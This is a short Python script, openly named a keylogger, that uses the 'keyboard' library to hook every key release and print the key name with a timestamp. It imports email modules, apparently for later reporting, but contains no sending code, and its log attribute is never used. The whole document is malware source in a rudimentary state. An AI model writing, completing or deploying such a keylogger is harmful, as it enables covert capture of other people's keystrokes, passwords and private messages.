import keyboard # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback(self, event):
        name = event.name
        print(f"{datetime.now()} - {name}")
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()
keylogger = Keylogger()
keylogger.start()